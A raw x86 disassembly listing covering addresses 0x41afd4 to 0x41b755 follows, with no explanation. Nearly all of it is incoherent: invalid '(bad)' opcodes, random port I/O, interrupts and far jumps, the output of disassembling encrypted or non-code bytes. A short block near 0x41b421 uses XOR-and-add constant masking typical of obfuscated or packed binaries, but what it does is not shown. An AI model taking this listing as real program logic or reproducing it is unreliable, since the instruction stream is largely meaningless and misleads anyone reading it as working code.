  41afd4:	mov    edi,DWORD PTR [eax-0x6ef4562]
  41afda:	ret    
  41afdb:	adc    esp,ebp
  41afdd:	jbe    0x41af7a
  41afdf:	mov    ch,0xa1
  41afe1:	out    0x96,al
  41afe3:	push   cs
  41afe4:	repnz xor al,BYTE PTR [edx+0x2420b431]
  41afeb:	sbb    esi,DWORD PTR [ecx]
  41afed:	and    BYTE PTR [esi],dh
  41afef:	shr    BYTE PTR [ebx-0x42574f5d],cl
  41aff5:	adc    edi,esi
  41aff7:	call   0x9252c2d7
  41affc:	mov    al,ds:0x684405fc
  41b001:	sub    al,0xe3
  41b003:	mov    gs,WORD PTR [ecx+eiz*1]
  41b006:	xchg   esp,eax
  41b007:	xor    dl,al
  41b009:	push   ebp
  41b00a:	mov    cl,0xfe
  41b00c:	xor    DWORD PTR [ebx-0x37],edi
  41b00f:	jbe    0x41af94
  41b011:	add    eax,ebx
  41b013:	dec    eax
  41b014:	lock stc 
  41b016:	ret    
  41b017:	out    0x7a,eax
  41b019:	adc    eax,esp
  41b01b:	scas   eax,DWORD PTR es:[edi]
  41b01c:	call   0x9854733
  41b021:	mov    eax,DWORD PTR [bp+si+0x77]
  41b025:	sbb    cl,dh
  41b027:	sbb    al,0xd
  41b029:	sbb    al,0xeb
  41b02b:	adc    dl,ch
  41b02d:	out    0xa4,al
  41b02f:	aam    0x6
  41b031:	sbb    al,0x59
  41b033:	in     al,0xfe
  41b035:	jae    0x41b0b2
  41b037:	scas   eax,DWORD PTR es:[edi]
  41b038:	xchg   edi,eax
  41b039:	xor    al,0xb3
  41b03b:	clc    
  41b03c:	add    eax,0x84cdced8
  41b041:	inc    ecx
  41b042:	jge    0x41b044
  41b044:	mov    ecx,0x4057aa89
  41b049:	or     ebp,DWORD PTR [edx-0x54]
  41b04c:	adc    ch,BYTE PTR [eax]
  41b04e:	ds mov bl,0x72
  41b051:	ss xchg edx,eax
  41b053:	test   DWORD PTR [edi+0x25726ec4],esi
  41b059:	outs   dx,BYTE PTR ds:[esi]
  41b05a:	push   0xe0288083
  41b05f:	ret    
  41b060:	fs sub cl,dl
  41b063:	push   ebx
  41b064:	rcl    DWORD PTR [esi],1
  41b066:	je     0x41b08e
  41b068:	ins    BYTE PTR es:[edi],dx
  41b069:	mov    ch,0x9c
  41b06b:	(bad)  
  41b06c:	fdivr  QWORD PTR [ecx+0x6f]
  41b06f:	repnz mov ds:0x66ec3804,al
  41b075:	dec    ebp
  41b076:	jp     0x41b084
  41b078:	mov    ds:0x68efa48c,al
  41b07d:	sub    dl,BYTE PTR [ebx]
  41b07f:	fimul  WORD PTR [edx+0x7eaa5085]
  41b085:	gs stc 
  41b087:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41b089:	xor    DWORD PTR [esi-0x6ed44c9c],0x4a
  41b090:	dec    ebp
  41b091:	xchg   BYTE PTR [eax-0x35],al
  41b094:	bound  ebx,QWORD PTR [edx-0xf]
  41b097:	adc    eax,0x8ba017c4
  41b09c:	cmc    
  41b09d:	sbb    eax,0xbc15e1c6
  41b0a2:	addr16 das 
  41b0a4:	sti    
  41b0a5:	push   ecx
  41b0a6:	outs   dx,DWORD PTR ds:[esi]
  41b0a7:	dec    ecx
  41b0a8:	ja     0x41b125
  41b0aa:	imul   edx,DWORD PTR [eax-0x20272168],0xdc8d361b
  41b0b4:	pop    ds
  41b0b5:	jmp    0x41b113
  41b0b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0b8:	ror    edi,cl
  41b0ba:	out    dx,al
  41b0bb:	mov    ss,WORD PTR [eax]
  41b0bd:	bnd jmp 0x7ed340f9
  41b0c3:	mov    DWORD PTR ds:0xdccc1bab,esp
  41b0c9:	iret   
  41b0ca:	sahf   
  41b0cb:	adc    DWORD PTR [edi],edx
  41b0cd:	push   edi
  41b0ce:	sbb    eax,0xbc0b927b
  41b0d3:	call   0xc3008e3
  41b0d8:	sbb    BYTE PTR [ecx-0x4810cddc],0x46
  41b0df:	jno    0x41b091
  41b0e1:	aad    0xfa
  41b0e3:	xor    bh,BYTE PTR cs:[edi]
  41b0e6:	dec    edx
  41b0e7:	or     esp,esp
  41b0e9:	int3   
  41b0ea:	aad    0xfe
  41b0ec:	cld    
  41b0ed:	mov    esi,0x6887a676
  41b0f2:	or     BYTE PTR cs:[edi+esi*1-0x6041d95a],cl
  41b0fa:	mov    ?,WORD PTR [ebx]
  41b0fc:	jg     0x41b0cb
  41b0fe:	ins    DWORD PTR es:[edi],dx
  41b0ff:	sbb    dl,BYTE PTR [esi]
  41b101:	rol    ecx,1
  41b103:	mov    ds:0x5e6a3f22,eax
  41b108:	push   edx
  41b109:	test   al,0x64
  41b10b:	mov    edi,0xfeaf8b69
  41b110:	lods   al,BYTE PTR ds:[esi]
  41b111:	iretw  
  41b113:	cli    
  41b114:	mov    ds:0x17282cd9,al
  41b119:	xor    eax,DWORD PTR [ebx-0x6c]
  41b11c:	hlt    
  41b11d:	dec    edi
  41b11e:	popa   
  41b11f:	pop    ecx
  41b120:	mov    bh,0x49
  41b122:	jne    0x41b0af
  41b124:	jmp    0x448c8cc7
  41b129:	pop    edx
  41b12a:	les    esi,FWORD PTR [ecx+0x3]
  41b12d:	and    DWORD PTR [esi+0x5a940cc7],eax
  41b133:	inc    edi
  41b134:	ret    
  41b135:	test   al,0xd7
  41b137:	sub    al,BYTE PTR [esi-0x62eacf39]
  41b13d:	jge    0x41b0d0
  41b13f:	pop    edx
  41b140:	xchg   ebp,eax
  41b141:	lods   al,BYTE PTR ds:[esi]
  41b142:	push   ss
  41b143:	out    dx,al
  41b144:	iret   
  41b145:	pop    ds
  41b146:	test   DWORD PTR [ebp-0x1dd3a70e],ebp
  41b14c:	mov    DWORD PTR [esi+0x399a16d7],edi
  41b152:	jmp    0xdb13:0xd94f8c2f
  41b159:	xchg   DWORD PTR [eax+eiz*8+0x69],ecx
  41b15d:	jns    0x41b1bc
  41b15f:	jbe    0x41b1a4
  41b161:	xchg   dh,cl
  41b163:	mov    ecx,0xdc3d9ca0
  41b168:	cmp    esi,ebp
  41b16a:	jg     0x41b148
  41b16c:	xlat   BYTE PTR ds:[ebx]
  41b16d:	ds cmp al,0x57
  41b170:	outs   dx,DWORD PTR ds:[esi]
  41b171:	in     al,0x1d
  41b173:	pop    ebp
  41b174:	inc    BYTE PTR [ebp-0x25]
  41b177:	mov    eax,0xd5803325
  41b17c:	pop    edi
  41b17d:	xchg   BYTE PTR [esi-0x3c49247d],dh
  41b183:	mov    eax,0x6cb743d5
  41b188:	xchg   esp,eax
  41b189:	xchg   DWORD PTR [ecx+0x583010af],ecx
  41b18f:	mov    ebp,0x47d9c678
  41b194:	retf   0xd47e
  41b197:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b198:	push   cs
  41b199:	or     dl,0xf0
  41b19c:	cli    
  41b19d:	int    0x45
  41b19f:	mov    edx,0x3f475f3
  41b1a4:	xchg   ebp,eax
  41b1a5:	test   al,0xdc
  41b1a7:	xacquire xchg DWORD PTR [edi+edx*2+0x4b465940],eax
  41b1af:	jecxz  0x41b1f9
  41b1b1:	sbb    eax,0xf0897adc
  41b1b6:	stos   BYTE PTR es:[edi],al
  41b1b7:	mov    al,ds:0xcd01dab4
  41b1bc:	push   ebx
  41b1bd:	rcr    cl,cl
  41b1bf:	cdq    
  41b1c0:	cmp    edx,DWORD PTR [eax-0x4648ffe1]
  41b1c6:	or     DWORD PTR [esi-0x15894963],edx
  41b1cc:	test   DWORD PTR [eax],edx
  41b1ce:	pop    edi
  41b1cf:	shl    ebx,cl
  41b1d1:	sbb    dh,ch
  41b1d3:	or     bl,BYTE PTR [eax]
  41b1d5:	and    DWORD PTR [esi-0x2f],ecx
  41b1d8:	mul    DWORD PTR [ecx]
  41b1da:	cld    
  41b1db:	sbb    al,0xb3
  41b1dd:	mov    cl,0xac
  41b1df:	addr16 dec ebp
  41b1e1:	mov    bl,0xd9
  41b1e3:	dec    ecx
  41b1e4:	mov    eax,DWORD PTR [ebp-0x1c]
  41b1e7:	jmp    0x41b41c
  41b1ec:	iret   
  41b1ed:	enter  0xd0d3,0xd3
  41b1f1:	fcmovnu st,st(3)
  41b1f3:	xlat   BYTE PTR ds:[ebx]
  41b1f4:	push   esp
  41b1f5:	rcr    BYTE PTR ss:[bp-0x60],0x55
  41b1fb:	outs   dx,BYTE PTR ds:[esi]
  41b1fc:	sub    ah,bl
  41b1fe:	jg     0x41b278
  41b200:	adc    BYTE PTR [esi+0x78],bh
  41b203:	js     0x41b1b1
  41b205:	mov    ax,WORD PTR [ebx+edx*4-0x7e7f797b]
  41b20d:	in     al,dx
  41b20e:	mov    bh,0x45
  41b210:	sbb    eax,0x80996a15
  41b215:	cs sub al,0xee
  41b218:	mov    ah,0x35
  41b21a:	fwait
  41b21b:	xor    edi,esi
  41b21d:	nop
  41b21e:	dec    ecx
  41b21f:	or     bh,bl
  41b221:	pop    esi
  41b222:	mov    cl,0xa
  41b224:	xlat   BYTE PTR ds:[ebx]
  41b225:	in     al,0x5b
  41b227:	xchg   esp,eax
  41b228:	sub    DWORD PTR [ebp+0x17],edx
  41b22b:	outs   dx,BYTE PTR es:[esi]
  41b22d:	pop    ecx
  41b22e:	add    ah,ch
  41b230:	xor    al,0x51
  41b232:	(bad)  
  41b234:	mov    cl,0xa6
  41b236:	dec    ebp
  41b237:	sbb    BYTE PTR [edx],bh
  41b239:	sbb    dh,BYTE PTR [ecx-0x5b304926]
  41b23f:	in     al,0x70
  41b241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b242:	repz sub BYTE PTR [ebx+ecx*1],dh
  41b246:	xchg   esi,eax
  41b247:	mov    edx,eax
  41b249:	div    ah
  41b24b:	and    bh,BYTE PTR [edi-0x5706c050]
  41b251:	in     eax,dx
  41b252:	(bad)  
  41b253:	pop    edx
  41b254:	add    eax,0xd41f2562
  41b259:	dec    eax
  41b25a:	in     al,0xb7
  41b25c:	jle    0x41b23b
  41b25e:	pop    edx
  41b25f:	fwait
  41b260:	and    BYTE PTR [edx+0x1cf86c87],cl
  41b266:	jns    0x41b2bb
  41b268:	mov    ds,WORD PTR [eax+edx*2]
  41b26b:	out    0x5f,al
  41b26d:	(bad)  
  41b26f:	not    BYTE PTR [ebx-0x5e650235]
  41b275:	aaa    
  41b276:	jle    0x41b222
  41b278:	inc    edi
  41b279:	sub    DWORD PTR [edx],esi
  41b27b:	and    eax,0xef04a54e
  41b280:	gs and ch,cl
  41b283:	sbb    al,0x26
  41b285:	pop    ds
  41b286:	in     eax,0x2d
  41b288:	xchg   esi,eax
  41b289:	in     eax,dx
  41b28a:	or     cl,dl
  41b28c:	push   esp
  41b28d:	test   eax,0xe1c950d5
  41b292:	inc    edi
  41b293:	mov    dh,0x84
  41b295:	mov    edx,0xaadf2158
  41b29a:	ins    DWORD PTR es:[edi],dx
  41b29b:	cmp    dh,0xe9
  41b29e:	pushf  
  41b29f:	ror    eax,1
  41b2a1:	inc    ebx
  41b2a2:	call   FWORD PTR [ebx+ebp*2]
  41b2a5:	push   ecx
  41b2a6:	jle    0x41b2fa
  41b2a8:	in     al,dx
  41b2a9:	push   eax
  41b2aa:	jo     0x41b284
  41b2ac:	mov    eax,ds:0xd7162586
  41b2b1:	dec    ecx
  41b2b2:	call   DWORD PTR [ecx]
  41b2b4:	and    esi,ebx
  41b2b6:	mov    bl,0x3
  41b2b8:	scas   eax,DWORD PTR es:[edi]
  41b2b9:	mov    ebx,0xaa2e17b
  41b2be:	std    
  41b2bf:	push   DWORD PTR [esi+0x163d5450]
  41b2c5:	outs   dx,DWORD PTR ds:[esi]
  41b2c6:	loopne 0x41b2d2
  41b2c8:	or     eax,0x51ffd29e
  41b2cd:	adc    ebx,ecx
  41b2cf:	clc    
  41b2d0:	(bad)  
  41b2d1:	add    bh,BYTE PTR [ecx]
  41b2d3:	mov    ?,WORD PTR ss:[ecx+0x2f]
  41b2d7:	inc    ebp
  41b2d8:	and    al,0x95
  41b2da:	arpl   WORD PTR [esi+0x195d6933],cx
  41b2e0:	push   eax
  41b2e1:	xchg   esi,eax
  41b2e2:	ds mov cl,0xec
  41b2e5:	pop    ebx
  41b2e6:	mov    esp,0x414ecf41
  41b2eb:	pop    eax
  41b2ec:	repnz mov ebp,fs
  41b2ef:	neg    BYTE PTR [eax+ebx*2-0x58]
  41b2f3:	or     eax,0xcbbae457
  41b2f8:	mov    ah,0x5e
  41b2fa:	jl     0x41b2f0
  41b2fc:	out    dx,al
  41b2fd:	stc    
  41b2fe:	or     al,0x22
  41b300:	mov    WORD PTR [eax+0x30],cs
  41b303:	test   DWORD PTR [ebx-0x23],ebp
  41b306:	shl    BYTE PTR [ebx+0x31],1
  41b309:	push   ss
  41b30a:	je     0x41b344
  41b30c:	push   ebx
  41b30d:	lock outs dx,BYTE PTR ds:[esi]
  41b30f:	out    0xf0,eax
  41b311:	data16 (bad) 
  41b313:	mov    ebx,0xda9fb1d
  41b318:	rol    BYTE PTR [esi+0x3159931c],0xfa
  41b31f:	inc    esi
  41b320:	dec    ecx
  41b321:	rcl    BYTE PTR [edx-0x5a],0x61
  41b325:	mov    ebp,0xf76c2d32
  41b32a:	mov    eax,ds:0x56736020
  41b32f:	jecxz  0x41b2f6
  41b331:	add    eax,0x60864350
  41b336:	cmp    BYTE PTR [edi-0x40],cl
  41b339:	hlt    
  41b33a:	aad    0xa4
  41b33c:	ins    BYTE PTR es:[edi],dx
  41b33d:	add    dl,cl
  41b33f:	mov    al,0x8c
  41b341:	imul   eax,edi,0x60cacd8f
  41b347:	jecxz  0x41b39a
  41b349:	inc    edi
  41b34a:	std    
  41b34b:	into   
  41b34c:	stos   BYTE PTR es:[edi],al
  41b34d:	loope  0x41b3c1
  41b34f:	ss mov bh,0xb1
  41b352:	jo     0x41b365
  41b354:	add    al,0x56
  41b356:	fs jns 0x41b396
  41b359:	sub    DWORD PTR [ebp+0x5470ad7],eax
  41b35f:	sbb    DWORD PTR [edi+0x647940a],esp
  41b365:	cli    
  41b366:	test   al,0xf4
  41b368:	pop    eax
  41b369:	outs   dx,DWORD PTR ds:[esi]
  41b36a:	shr    edi,1
  41b36c:	test   BYTE PTR [edi],cl
  41b36e:	mov    edx,0xe0211b1d
  41b373:	aam    0x8a
  41b375:	mov    ds,WORD PTR [ecx+0x1c11305a]
  41b37b:	in     eax,dx
  41b37c:	jmp    0x41b3e2
  41b37e:	cmc    
  41b37f:	out    dx,al
  41b380:	fstp   TBYTE PTR [edi+0x7e]
  41b383:	dec    ebp
  41b384:	mov    esp,0xdcbacfa8
  41b389:	jle    0x41b384
  41b38b:	rol    DWORD PTR [edi],0xea
  41b38e:	clc    
  41b38f:	push   ecx
  41b390:	push   edx
  41b391:	enter  0x1ac4,0x85
  41b395:	pop    esp
  41b396:	or     BYTE PTR [eax+0x5bf19371],al
  41b39c:	cli    
  41b39d:	push   esp
  41b39e:	and    BYTE PTR [ebp+eiz*8-0x63610456],ch
  41b3a5:	xor    DWORD PTR [edi+0x1c],edx
  41b3a8:	(bad)  
  41b3a9:	xchg   edi,eax
  41b3aa:	mov    eax,ds:0x2986ab58
  41b3af:	push   edx
  41b3b0:	xchg   esp,eax
  41b3b1:	sub    al,0x58
  41b3b3:	cwde   
  41b3b4:	cwde   
  41b3b5:	aad    0xdb
  41b3b7:	sub    ebp,ebx
  41b3b9:	push   0x9c58f416
  41b3be:	and    eax,0xb5a32045
  41b3c3:	repnz xor ebp,esp
  41b3c6:	clc    
  41b3c7:	push   ebp
  41b3c8:	xor    BYTE PTR [ebx-0x33],0x97
  41b3cc:	imul   esi,DWORD PTR [ebp+eax*2+0x78a91b53],0xffffffa4
  41b3d4:	sub    bh,0x60
  41b3d7:	push   0x27
  41b3d9:	shl    ecx,1
  41b3db:	xchg   esi,eax
  41b3dc:	inc    ecx
  41b3dd:	mov    al,ds:0xe65c034d
  41b3e2:	dec    ecx
  41b3e3:	and    DWORD PTR [edi+0x726f12da],edi
  41b3e9:	inc    esp
  41b3ea:	inc    ebp
  41b3eb:	add    edi,0xdc661f41
  41b3f1:	bound  ebx,QWORD PTR [esi+ebp*1+0x583c8ce1]
  41b3f8:	ins    DWORD PTR es:[edi],dx
  41b3f9:	shl    BYTE PTR [edi],1
  41b3fb:	aad    0xd0
  41b3fd:	inc    ecx
  41b3fe:	dec    ecx
  41b3ff:	add    DWORD PTR [eax],0x768e13ad
  41b405:	jg     0x41b436
  41b407:	lock dec esi
  41b409:	ja     0x41b40e
  41b40b:	imul   edi,DWORD PTR [edi-0x27a52955],0xffffffa2
  41b412:	pop    esp
  41b413:	add    esp,edi
  41b415:	test   BYTE PTR [edx+0x32],ch
  41b418:	inc    esi
  41b419:	scas   al,BYTE PTR es:[edi]
  41b41a:	push   es
  41b41b:	xor    BYTE PTR [edi],cl
  41b41d:	scas   eax,DWORD PTR es:[edi]
  41b41e:	shr    DWORD PTR [ebx],0xe0
  41b421:	mov    DWORD PTR [ebp-0x24],esp
  41b424:	mov    eax,DWORD PTR [ebp-0x4]
  41b427:	mov    ecx,0x7510850
  41b42c:	xor    eax,ecx
  41b42e:	mov    edx,0x327298
  41b433:	add    eax,edx
  41b435:	mov    DWORD PTR [ebp+0x8],eax
  41b438:	mov    eax,DWORD PTR [ebp-0x18]
  41b43b:	xor    eax,ecx
  41b43d:	add    eax,edx
  41b43f:	mov    edx,DWORD PTR [ebp+0x14]
  41b442:	imul   eax,DWORD PTR [edx]
  41b445:	mov    edx,DWORD PTR [ebp-0x4]
  41b448:	xor    edx,ecx
  41b44a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b44d:	lea    ecx,[edx+ecx*1+0x327298]
  41b454:	cmp    ecx,eax
  41b456:	je     0x41bfd6
  41b45c:	mov    edi,DWORD PTR [ebp-0x18]
  41b45f:	mov    eax,DWORD PTR [ebp+0x8]
  41b462:	mov    edx,DWORD PTR [ebp+0x14]
  41b465:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41b469:	mov    ecx,0x7510850
  41b46e:	xor    edx,edx
  41b470:	xor    edi,ecx
  41b472:	mov    esi,0x327298
  41b477:	add    edi,esi
  41b479:	div    edi
  41b47b:	mov    edx,DWORD PTR [ebp-0x4]
  41b47e:	xor    edx,ecx
  41b480:	lea    eax,[edx+eax*1+0x327298]
  41b487:	mov    edx,DWORD PTR [ebp+0x8]
  41b48a:	mov    edi,DWORD PTR [ebp-0x24]
  41b48d:	mov    DWORD PTR [edi+edx*4],eax
  41b490:	mov    eax,DWORD PTR [ebp-0x18]
  41b493:	mov    edx,DWORD PTR [ebp+0x8]
  41b496:	xor    eax,ecx
  41b498:	lea    eax,[eax+edx*1+0x327298]
  41b49f:	mov    DWORD PTR [ebp+0x8],eax
  41b4a2:	mov    eax,DWORD PTR [ebp-0x18]
  41b4a5:	mov    edx,DWORD PTR [ebp+0x14]
  41b4a8:	jmp    0x41b6dd
  41b4ad:	int3   
  41b4ae:	(bad)  
  41b4af:	retf   0xd9d6
  41b4b2:	fxch   st(4)
  41b4b4:	leave  
  41b4b5:	mov    ch,0xbb
  41b4b7:	push   ds
  41b4b8:	hlt    
  41b4b9:	(bad)  
  41b4ba:	sti    
  41b4bb:	leave  
  41b4bc:	stos   BYTE PTR es:[edi],al
  41b4bd:	shl    dl,0x7f
  41b4c0:	js     0x41b4d2
  41b4c2:	jle    0x41b53c
  41b4c4:	js     0x41b4ce
  41b4c6:	sti    
  41b4c7:	loopne 0x41b46a
  41b4c9:	lea    eax,[ecx+0x6e]
  41b4cc:	jg     0x41b4b3
  41b4ce:	xor    BYTE PTR [ebx-0x7d1f43d8],ah
  41b4d4:	add    DWORD PTR [edx],edx
  41b4d6:	jle    0x41b49a
  41b4d8:	(bad)  
  41b4d9:	adc    DWORD PTR [ebp-0x3fdeed6f],edx
  41b4df:	test   eax,0xf3a7c9ad
  41b4e4:	adc    eax,0x9c806635
  41b4e9:	dec    edx
  41b4ea:	(bad)  
  41b4ec:	adc    bh,dh
  41b4ee:	cmc    
  41b4ef:	push   ds
  41b4f0:	scas   eax,DWORD PTR es:[edi]
  41b4f1:	and    ebx,DWORD PTR [edx-0x7d828fa4]
  41b4f7:	xor    ah,ch
  41b4f9:	sub    al,0x16
  41b4fb:	scas   al,BYTE PTR es:[edi]
  41b4fc:	out    dx,al
  41b4fd:	mov    al,0xf8
  41b4ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b500:	loop   0x41b579
  41b502:	jnp    0x41b4f8
  41b504:	xor    cl,BYTE PTR [ebp-0x24]
  41b507:	mov    WORD PTR [ebx+0x504546ef],ss
  41b50d:	or     esi,DWORD PTR cs:[ecx-0x2112f5fd]
  41b514:	jmp    0xcf3a8c8e
  41b519:	mov    ecx,fs
  41b51b:	mov    al,ds:0xe50dec17
  41b520:	shl    ebp,cl
  41b522:	inc    esi
  41b523:	push   ebx
  41b524:	(bad)  
  41b525:	lods   eax,DWORD PTR ds:[esi]
  41b526:	aam    0x9a
  41b528:	adc    BYTE PTR [ebx+0x273a89b5],ah
  41b52e:	pop    edi
  41b52f:	or     DWORD PTR [edi],eax
  41b531:	mov    edx,0xd6c75daf
  41b536:	bound  ebx,QWORD PTR [esi]
  41b538:	mov    ah,0x8b
  41b53a:	mov    al,ds:0xdc038178
  41b53f:	mov    ah,0xe6
  41b541:	adc    al,0x36
  41b543:	mov    edi,0xedace7b5
  41b548:	jnp    0x41b522
  41b54a:	aaa    
  41b54b:	jae    0x41b578
  41b54d:	cmc    
  41b54e:	push   eax
  41b54f:	pop    es
  41b550:	push   ebx
  41b551:	dec    ebp
  41b552:	call   0xa10c1ab7
  41b557:	inc    edx
  41b558:	add    eax,0x6a59347a
  41b55d:	adc    bl,BYTE PTR [eax]
  41b55f:	imul   esp,DWORD PTR [edx+0x23],0x454b9c60
  41b566:	dec    esi
  41b567:	daa    
  41b568:	adc    cl,cl
  41b56a:	js     0x41b5b0
  41b56c:	mov    esi,0x6f42f317
  41b571:	jo     0x41b5ac
  41b573:	xchg   esp,eax
  41b574:	sub    dh,BYTE PTR ds:0x69af5935
  41b57a:	test   DWORD PTR [edx+0x4cdae46e],ecx
  41b580:	jns    0x41b58c
  41b582:	dec    edx
  41b583:	sti    
  41b584:	das    
  41b585:	arpl   WORD PTR [ecx-0x2b7902f8],cx
  41b58b:	aas    
  41b58c:	retf   
  41b58d:	shufps xmm5,xmm4,0xce
  41b591:	std    
  41b592:	jmp    0x3a75:0xa608bc08
  41b599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b59a:	fdivr  DWORD PTR [eax]
  41b59c:	push   ds
  41b59d:	mov    dh,0x6f
  41b59f:	aad    0x11
  41b5a1:	shl    DWORD PTR [ebp-0x14fa28f3],0xc5
  41b5a8:	scas   eax,DWORD PTR es:[edi]
  41b5a9:	push   eax
  41b5aa:	and    al,0x63
  41b5ac:	or     eax,0x42e204a5
  41b5b1:	fisub  WORD PTR [ebx]
  41b5b3:	adc    DWORD PTR [ebx],ebp
  41b5b5:	je     0x41b5ef
  41b5b7:	cld    
  41b5b8:	xchg   ecx,eax
  41b5b9:	(bad)  
  41b5ba:	adc    edx,ecx
  41b5bc:	div    BYTE PTR [esi-0x43b458c8]
  41b5c2:	inc    DWORD PTR [ebp+0x10]
  41b5c5:	inc    eax
  41b5c6:	or     dh,ch
  41b5c8:	mov    dl,0xf9
  41b5ca:	rcr    al,0x4d
  41b5cd:	add    cl,BYTE PTR [edx-0x37]
  41b5d0:	cli    
  41b5d1:	jne    0x41b58d
  41b5d3:	(bad)  
  41b5d4:	icebp  
  41b5d5:	cmp    DWORD PTR [esi-0x595f1bbd],edx
  41b5db:	popf   
  41b5dc:	push   eax
  41b5dd:	mov    ebx,0x1ae5a33c
  41b5e2:	dec    esp
  41b5e3:	popf   
  41b5e4:	outs   dx,DWORD PTR ds:[esi]
  41b5e5:	push   ss
  41b5e6:	and    al,bh
  41b5e8:	inc    ebp
  41b5e9:	lock add al,0x4a
  41b5ec:	mov    ecx,0xe2f7e304
  41b5f1:	jle    0x41b5df
  41b5f3:	mov    dh,0x5f
  41b5f5:	clc    
  41b5f6:	imul   esi,DWORD PTR [ebp-0x6a],0xffffffb2
  41b5fa:	jl     0x41b582
  41b5fc:	(bad)  
  41b5fd:	(bad)  
  41b5fe:	xchg   ebx,eax
  41b5ff:	cmp    BYTE PTR [ecx],ah
  41b601:	sar    edi,1
  41b603:	xchg   ecx,eax
  41b604:	dec    esi
  41b605:	sbb    eax,0x17f4a068
  41b60a:	adc    eax,eax
  41b60c:	jb     0x41b643
  41b60e:	push   ds
  41b60f:	(bad)  
  41b610:	fwait
  41b611:	jo     0x41b5c5
  41b613:	inc    edi
  41b614:	lock fmul DWORD PTR [edx-0x3e508ebf]
  41b61b:	leave  
  41b61c:	mov    al,ds:0x881906e
  41b621:	pop    edx
  41b622:	(bad)  
  41b624:	int    0xfd
  41b626:	mov    DWORD PTR [ebx],edx
  41b628:	sub    DWORD PTR [esi+0x24a2d5b9],0xef9d3830
  41b632:	sti    
  41b633:	mov    ss,WORD PTR [ebp+0xd02d627]
  41b639:	test   ch,ah
  41b63b:	jmp    0x41b5fc
  41b63d:	push   edi
  41b63e:	sbb    ebx,DWORD PTR [esi-0x4e]
  41b641:	push   cs
  41b642:	push   cs
  41b643:	gs sahf 
  41b645:	imul   ebx,DWORD PTR [esi+0x75515995],0x46
  41b64c:	dec    ebx
  41b64d:	pop    edx
  41b64e:	sbb    eax,0xd6d8c71e
  41b653:	mov    eax,ds:0xa7d54f8
  41b658:	fs push 0x4fd31acb
  41b65e:	xor    bh,BYTE PTR [edx+eiz*8]
  41b661:	mov    ds:0xcfde2722,al
  41b666:	inc    ebx
  41b667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b668:	pop    ecx
  41b669:	jge    0x41b6e1
  41b66b:	push   eax
  41b66c:	imul   esp,ebp,0x5ad06680
  41b672:	mov    ds:0xfc309191,eax
  41b677:	cld    
  41b678:	pop    esp
  41b679:	dec    edi
  41b67a:	mov    esi,0x6b03ee84
  41b67f:	dec    eax
  41b680:	sahf   
  41b681:	xchg   edi,eax
  41b682:	dec    ecx
  41b683:	mov    BYTE PTR [edi-0x73],ch
  41b686:	push   ecx
  41b687:	xchg   ebx,eax
  41b688:	in     eax,dx
  41b689:	sbb    al,0x5e
  41b68b:	or     esi,DWORD PTR [eax]
  41b68d:	adc    DWORD PTR [edx+0xcbbb4e],ebx
  41b693:	pop    ebx
  41b694:	cdq    
  41b695:	jnp    0x41b6f0
  41b697:	sub    dl,BYTE PTR [esi+0x0]
  41b69a:	mov    ecx,0xcfdda188
  41b69f:	addr16 jmp 0x3bde:0x4416e365
  41b6a7:	cmp    edx,eax
  41b6a9:	pushf  
  41b6aa:	cmp    DWORD PTR ds:0xd1bcb0c5,eax
  41b6b0:	dec    esi
  41b6b1:	xor    edi,esp
  41b6b3:	scas   eax,DWORD PTR es:[edi]
  41b6b4:	repz pop ds
  41b6b6:	mov    eax,ds:0x96f2b7f
  41b6bb:	sub    al,0x73
  41b6bd:	xchg   ecx,eax
  41b6be:	jne    0x41b6bf
  41b6c0:	dec    ecx
  41b6c1:	and    al,0xc
  41b6c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6c4:	mov    edi,0x66ed7870
  41b6c9:	sbb    al,0xc0
  41b6cb:	cwde   
  41b6cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6cd:	jl     0x41b664
  41b6cf:	scas   al,BYTE PTR es:[edi]
  41b6d0:	pop    ecx
  41b6d1:	test   BYTE PTR [esi],bh
  41b6d3:	jno    0x41b67a
  41b6d5:	push   ebp
  41b6d6:	mov    bh,0xe4
  41b6d8:	retf   
  41b6d9:	clc    
  41b6da:	or     eax,0xc133b025
  41b6df:	add    eax,esi
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0x39f4970a]
  41b6f4:	pop    ebx
  41b6f5:	xchg   ecx,eax
  41b6f6:	fsub   st,st(0)
  41b6f8:	jg     0x41b772
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b6cb
  41b6ff:	out    0x92,eax
  41b701:	push   ss
  41b702:	outs   dx,DWORD PTR ss:[esi]
  41b704:	cmp    dh,cl
  41b706:	mov    esi,0x9653ecf9
  41b70b:	cdq    
  41b70c:	adc    eax,0xb0759d1e
  41b711:	into   
  41b712:	sub    ecx,DWORD PTR [ebx+ebx*4-0x9]
  41b716:	cdq    
  41b717:	mov    ch,BYTE PTR [esi]
  41b719:	pop    esp
  41b71a:	lds    esp,FWORD PTR [edi]
  41b71c:	aaa    
  41b71d:	clc    
  41b71e:	out    dx,al
  41b71f:	pop    edx
  41b720:	mov    cl,0x92
  41b722:	dec    esp
  41b723:	xchg   esi,eax
  41b724:	push   ss
  41b725:	rol    DWORD PTR [esi+0x4b],1
  41b728:	rol    edi,cl
  41b72a:	ffree  st(4)
  41b72c:	dec    eax
  41b72d:	loopne 0x41b754
  41b72f:	gs sahf 
  41b731:	xchg   bl,cl
  41b733:	bound  ebx,QWORD PTR [ebx-0x66499d5e]
  41b739:	xchg   ebp,eax
  41b73a:	inc    eax
  41b73b:	or     BYTE PTR [edx-0x4],al
  41b73e:	xor    BYTE PTR [ecx-0x74],bh
  41b741:	pop    ebx
  41b742:	add    cl,dh
  41b744:	sbb    eax,0x9eca9365
  41b749:	sub    DWORD PTR ds:0xbfd3267a,0x19
  41b750:	push   0xcbaf7282
  41b755:	sar    DWORD PTR [esi],1
